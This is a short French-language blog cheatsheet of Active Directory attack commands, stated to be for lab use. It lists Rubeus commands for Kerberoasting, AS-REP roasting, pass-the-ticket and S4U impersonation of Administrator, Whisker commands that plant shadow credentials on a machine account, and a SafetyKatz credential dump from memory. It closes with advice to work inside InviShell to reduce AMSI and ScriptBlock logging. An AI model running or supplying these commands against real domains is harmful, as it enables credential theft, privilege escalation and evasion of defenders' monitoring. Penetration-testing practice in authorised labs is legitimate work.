---
title: "Ma cheatsheet Rubeus / Whisker / SafetyKatz"
description: "Les commandes que je retape le plus souvent en lab AD, regroupées par objectif."
date: 2026-05-19
tags: ["cheatsheet", "tooling", "kerberos"]
draft: false
---

## Rubeus — l'essentiel

```powershell
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP roasting
Rubeus.exe asreproast /format:hashcat

# Pass-the-ticket
Rubeus.exe ptt /ticket:<BASE64>

# S4U (delegation)
Rubeus.exe s4u /user:SVC$ /rc4:<HASH> /impersonateuser:Administrator `
  /msdsspn:cifs/target /ptt
```

## Whisker — Shadow Credentials

```powershell
Whisker.exe add /target:WS01$
Whisker.exe list /target:WS01$
Whisker.exe remove /target:WS01$ /deviceid:<ID>
```

## SafetyKatz — dump propre

```powershell
SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
```

> Rappel : toujours bosser dans **InviShell** pour réduire le logging AMSI /
> ScriptBlock pendant ces manips en lab.
